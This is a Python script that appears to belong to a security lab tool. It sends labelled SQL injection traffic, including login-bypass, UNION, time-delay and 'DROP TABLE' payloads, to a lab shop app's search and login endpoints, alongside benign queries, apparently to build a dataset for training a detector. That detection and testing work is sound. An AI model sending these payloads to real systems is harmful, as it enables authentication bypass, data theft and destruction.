"""Send SQL injection lab traffic aligned with Modified_SQL_Dataset.csv."""
from __future__ import annotations

import argparse
import random
import re
import sys
import time
from collections import Counter
from typing import Iterable, Optional

import requests

try:
    from attacker.dataset_payloads import (
        load_sqli_attack_payloads,
        load_sqli_normal_queries,
    )
    from attacker.events import (
        add_events_arg,
        close_events,
        configure_events,
        emit,
        vuln_for,
    )
    from attacker.normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url
except ImportError:  # running as `python attacker/sqli_attack.py`
    from dataset_payloads import load_sqli_attack_payloads, load_sqli_normal_queries
    from events import (
        add_events_arg,
        close_events,
        configure_events,
        emit,
        vuln_for,
    )
    from normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url

ATTACK_LABEL = "sqli"
NORMAL_LABEL = "normal"

# Fallback if CSV missing — still dataset-like classic injections
_FALLBACK_ATTACKS = [
    "admin' OR '1'='1' --",
    "1' OR 1=1 --",
    "' UNION SELECT null,null,null,null--",
    "1; DROP TABLE users;--",
    "1' OR SLEEP(2)--",
]
_FALLBACK_NORMALS = [
    "select version",
    "show tables",
    "user profile",
    "order history",
]


def pad_payload(payload: str) -> str:
    """Dataset-style padding: extra spaces around operators / parentheses / keywords."""
    out = payload
    for token in ("(", ")", "=", ";", ",", "||", "--", "#"):
        out = out.replace(token, f" {token} ")
    for kw in (
        "OR",
        "AND",
        "UNION",
        "SELECT",
        "FROM",
        "WHERE",
        "DROP",
        "TABLE",
        "SLEEP",
        "WAITFOR",
        "DELAY",
        "NULL",
    ):
        out = re.sub(rf"\b{kw}\b", f" {kw} ", out, flags=re.IGNORECASE)
    return re.sub(r"[ \t]+", " ", out).strip()


def expand_payloads(payloads: Iterable[str]) -> list[tuple[str, str]]:
    """Return (style, payload) pairs: compact + padded for each entry."""
    expanded: list[tuple[str, str]] = []
    for raw in payloads:
        expanded.append(("compact", raw))
        padded = pad_payload(raw)
        if padded != raw:
            expanded.append(("padded", padded))
        else:
            expanded.append(("padded", raw))
    return expanded


def _short_delay() -> None:
    time.sleep(random.uniform(0.03, 0.2))


def _send(
    session: requests.Session,
    method: str,
    url: str,
    *,
    label: str,
    counts: Counter,
    action: Optional[str] = None,
    command: Optional[str] = None,
    **kwargs,
) -> requests.Response:
    headers = kwargs.pop("headers", {})
    headers = {**headers, "X-Test-Label": label}
    kwargs.setdefault("timeout", 20)
    kwargs.setdefault("allow_redirects", False)
    t0 = time.perf_counter()
    response = session.request(method, url, headers=headers, **kwargs)
    duration_ms = (time.perf_counter() - t0) * 1000.0
    counts[response.status_code] += 1
    emit(
        "result",
        command=command,
        action=action or f"{method} {url}",
        log=f"{method} {url} → {response.status_code} (label={label})",
        result={
            "method": method,
            "url": url,
            "status_code": response.status_code,
            "label": label,
        },
        vulnerability=vuln_for(label if not label.startswith("sqli") else "sqli"),
        edge={"from": "attacker", "to": "orbitmart", "label": label},
        status="ok" if response.status_code < 500 else "error",
        duration_ms=round(duration_ms, 2),
    )
    _short_delay()
    return response


def run_attacks(
    base_url: str, *, payload_source: str = "test"
) -> tuple[Counter, Counter]:
    assert_safe_base_url(base_url)
    base = base_url.rstrip("/")
    attack_counts: Counter = Counter()
    normal_counts: Counter = Counter()
    session = requests.Session()
    session.headers["User-Agent"] = (
        "CyberMirror-SQLiAttack/1.0 (+lab; dataset-aligned)"
    )
    source = (payload_source or "test").strip().lower()
    if source not in {"test", "train", "all", "ood"}:
        source = "test"

    try:
        sqli_payloads = load_sqli_attack_payloads(limit=24, split=source)  # type: ignore[arg-type]
        normal_search = load_sqli_normal_queries(limit=12, split=source)  # type: ignore[arg-type]
    except Exception as exc:
        print(f"Dataset load failed ({exc}); using fallback payloads", file=sys.stderr)
        sqli_payloads = list(_FALLBACK_ATTACKS)
        normal_search = list(_FALLBACK_NORMALS)

    attack_payloads = expand_payloads(sqli_payloads)
    print(f"Target: {base}")
    print(f"Payload source: {source}")
    print(
        f"Attack payloads: {len(sqli_payloads)} unique "
        f"-> {len(attack_payloads)} after compact/padded"
    )
    print(f"Normal searches: {len(normal_search)}")
    print()
    emit(
        "log",
        log=(
            f"Target={base}; source={source}; payloads={len(sqli_payloads)} unique "
            f"→ {len(attack_payloads)} compact/padded; normals={len(normal_search)}"
        ),
        vulnerability=vuln_for("sqli"),
    )

    # Attack traffic on OrbitMart catalog + login (same sinks, dataset strings)
    for style, payload in attack_payloads:
        label = f"sqli_{style}"
        cmd = f'GET /search?q={payload!r}'
        print(f"[sqli/{style}] search q={payload!r}")
        emit(
            "command",
            command=cmd,
            action=f"SQLi catalog search ({style})",
            log=f"[sqli/{style}] search q={payload!r}",
            vulnerability=vuln_for("sqli"),
            edge={"from": "attacker", "to": "lab_db", "label": "inject"},
        )
        _send(
            session,
            "GET",
            f"{base}/search",
            label=label,
            counts=attack_counts,
            command=cmd,
            action=f"SQLi catalog search ({style})",
            params={"q": payload},
        )

        cmd_login = f"POST /login username={payload!r}"
        print(f"[sqli/{style}] login username={payload!r}")
        emit(
            "command",
            command=cmd_login,
            action=f"SQLi-shaped login username ({style})",
            log=f"[sqli/{style}] login username={payload!r}",
            vulnerability=vuln_for("sqli_login"),
        )
        _send(
            session,
            "POST",
            f"{base}/login",
            label=label,
            counts=attack_counts,
            command=cmd_login,
            action=f"SQLi-shaped login username ({style})",
            data={"username": payload, "password": "AttackPass123!"},
        )

    for term in normal_search:
        cmd = f"GET /search?q={term!r}"
        print(f"[normal] search q={term!r}")
        emit(
            "command",
            command=cmd,
            action="Benign catalog search",
            log=f"[normal] search q={term!r}",
            vulnerability=vuln_for("normal"),
        )
        _send(
            session,
            "GET",
            f"{base}/search",
            label=NORMAL_LABEL,
            counts=normal_counts,
            command=cmd,
            action="Benign catalog search",
            params={"q": term},
        )

    return attack_counts, normal_counts


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Lab SQLi traffic. Default payloads are the held-out test split "
            "(not the training rows)."
        )
    )
    parser.add_argument(
        "--base-url",
        default=DEFAULT_BASE_URL,
        help=f"CyberMirror base URL (default: {DEFAULT_BASE_URL})",
    )
    parser.add_argument(
        "--payload-source",
        choices=("test", "train", "all", "ood"),
        default="test",
        help=(
            "test=held-out CSV split (default); train=training rows; "
            "all=full CSV; ood=obfuscated out-of-distribution payloads"
        ),
    )
    add_events_arg(parser)
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv)
    configure_events(
        args.events_file,
        suite="sqli",
        base_url=args.base_url,
        meta={
            "cli": "python -m attacker.sqli_attack",
            "payload_source": args.payload_source,
        },
    )
    emit(
        "command",
        command=f"python -m attacker.sqli_attack --base-url {args.base_url}",
        action="Launch SQLi attack suite",
        vulnerability=vuln_for("sqli"),
    )
    try:
        attack_counts, normal_counts = run_attacks(
            args.base_url, payload_source=args.payload_source
        )
    except requests.RequestException as exc:
        print(f"Request failed: {exc}", file=sys.stderr)
        close_events(status="failed", score={"error": str(exc)})
        return 1

    print()
    print("=== Summary (X-Test-Label: sqli) ===")
    print(f"Requests sent: {sum(attack_counts.values())}")
    print("Status codes:")
    for code in sorted(attack_counts):
        print(f"  {code}: {attack_counts[code]}")

    print()
    print("=== Summary (X-Test-Label: normal) ===")
    print(f"Requests sent: {sum(normal_counts.values())}")
    print("Status codes:")
    for code in sorted(normal_counts):
        print(f"  {code}: {normal_counts[code]}")

    score = {
        "attack_requests": sum(attack_counts.values()),
        "normal_requests": sum(normal_counts.values()),
        "attack_status_codes": dict(attack_counts),
        "normal_status_codes": dict(normal_counts),
        "outcome": "traffic_sent",
    }
    emit("score", score=score, action="SQLi suite summary", status="completed")
    close_events(status="completed", score=score)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
